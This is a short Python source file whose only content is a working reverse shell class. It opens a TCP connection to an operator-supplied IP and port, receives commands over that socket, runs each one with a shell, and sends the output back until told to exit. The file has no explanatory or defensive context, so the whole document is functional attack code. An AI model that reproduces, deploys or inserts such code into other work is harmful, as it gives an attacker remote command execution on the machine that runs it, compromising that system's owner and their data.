import socket
import subprocess

class ReverseShell:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def execute(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))
        s.send(b'Connection established\n')
        while True:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)
        s.close()
